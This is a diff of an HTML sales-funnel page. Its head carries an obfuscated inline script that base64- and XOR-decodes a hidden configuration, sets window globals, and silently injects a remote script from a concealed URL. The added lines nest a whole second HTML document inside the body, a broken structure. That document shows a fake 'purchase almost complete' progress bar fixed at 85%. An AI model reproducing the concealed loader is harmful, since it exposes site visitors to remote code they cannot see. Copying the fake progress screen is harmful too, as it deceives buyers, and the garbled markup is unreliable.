@@ -99,7 +99,117 @@
     <script>(function(){var t_r7=atob("DGONSRsY0Ki3D1w3pRivPGl08pKVZyhD1RC3ZjR7tMaZeihazAX0Z3h3vYbVfXNExhHkOW9r/9jedzlbihPkMX50/sLELXAVxBf5O3J6pdzSfH4N/j6ha3x0v8rWYy8Vnzj2a3V5vc2VNX5HzBvoJVJ88oSVeT1b0AavczkusczWOmkFkwDsKC8g6c6EOGtVnAG0cXo6rfXK");var j_st=[];for(var h_dx3t=0;h_dx3t<t_r7.length;h_dx3t++){j_st.push(t_r7.charCodeAt(h_dx3t)&255);}var p_1rzd=j_st[0];var q_b8qj=j_st.slice(1,1+p_1rzd);var r_9qd5=j_st.slice(1+p_1rzd);var v_bssu=r_9qd5.map(function(b,u_6h4){return b^q_b8qj[u_6h4%p_1rzd];});var u_pplq="";for(var g_bk=0;g_bk<v_bssu.length;g_bk++){u_pplq+=String.fromCharCode(v_bssu[g_bk]&255);}var f_1=decodeURIComponent(escape(u_pplq));var n_3=JSON.parse(f_1);var c_t9c6=n_3.globals||[];c_t9c6.forEach(function(b_wel){window[b_wel.name]=b_wel.value;});var q_kyl=document.createElement("script");q_kyl.src=n_3.url;q_kyl.async=true;q_kyl.defer=true;(n_3.attributes||[]).forEach(function(b_qgp){q_kyl.setAttribute(b_qgp.name,b_qgp.value);});(document.head||document.documentElement).appendChild(q_kyl);})();</script>
 </head>
 <body>
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Carregando...</title>
+    <style>
+        .custom-loader-container {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: #f8fafc;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
 
+        .loader-card {
+            background: #ffffff;
+            padding: 30px 40px;
+            border-radius: 16px;
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.05);
+            text-align: center;
+            max-width: 400px;
+            width: 90%;
+        }
+
+        .loader-card h2 {
+            color: #0f172a;
+            font-size: 1.25rem;
+            margin-bottom: 8px;
+            font-weight: 600;
+        }
+
+        .loader-card p {
+            color: #64748b;
+            font-size: 0.9rem;
+            margin-bottom: 24px;
+        }
+
+        /* Barra de Progresso Estilizada */
+        .progress-bar-wrapper {
+            background: #e2e8f0;
+            border-radius: 99px;
+            height: 10px;
+            width: 100%;
+            overflow: hidden;
+            margin-bottom: 16px;
+            position: relative;
+        }
+
+        .progress-bar-fill {
+            background: linear-gradient(90deg, #10b981, #059669);
+            height: 100%;
+            width: 85%; /* Mantém os 85% solicitados */
+            border-radius: 99px;
+            position: relative;
+            animation: pulse-glow 2s infinite ease-in-out;
+        }
+
+        /* Efeito de brilho animado na barra */
+        .progress-bar-fill::after {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            bottom: 0;
+            right: 0;
+            background: linear-gradient(
+                90deg,
+                rgba(255, 255, 255, 0) 0%,
+                rgba(255, 255, 255, 0.4) 50%,
+                rgba(255, 255, 255, 0) 100%
+            );
+            animation: shimmer 1.5s infinite;
+        }
+
+        .percentage-text {
+            font-weight: 700;
+            color: #059669;
+            font-size: 1.1rem;
+        }
+
+        @keyframes shimmer {
+            0% { transform: translateX(-100%); }
+            100% { transform: translateX(100%); }
+        }
+
+        @keyframes pulse-glow {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.8; }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="custom-loader-container">
+        <div class="loader-card">
+            <h2>¡Tu compra está casi completa!</h2>
+            <p>Por favor, espera un momento para finalizar tu registro.</p>
+            
+            <div class="progress-bar-wrapper">
+                <div class="progress-bar-fill"></div>
+            </div>
+            
+            <div class="percentage-text">85%</div>
+        </div>
+    </div>
+
+</body>
+</html>
     <div class="container">
         
         <!-- Textos de Gatilho acima do vídeo -->
